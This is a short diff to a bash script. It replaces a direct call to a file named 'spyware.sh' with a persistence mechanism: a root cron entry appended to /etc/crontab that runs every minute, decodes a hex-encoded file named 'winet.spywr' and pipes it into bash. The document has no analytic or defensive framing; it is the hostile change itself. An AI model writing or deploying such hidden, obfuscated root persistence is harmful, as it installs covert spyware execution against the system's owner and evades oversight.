@@ -1,3 +1,4 @@
 #!/usr/bin/env bash
 
-sudo /opt/pysnake/spyware.sh
+sudo touch /etc/wispi/winet.db
+sudo echo "* * * * * root (xxd -p -r /etc/wispi/winet.spywr | bash -)" >> /etc/crontab
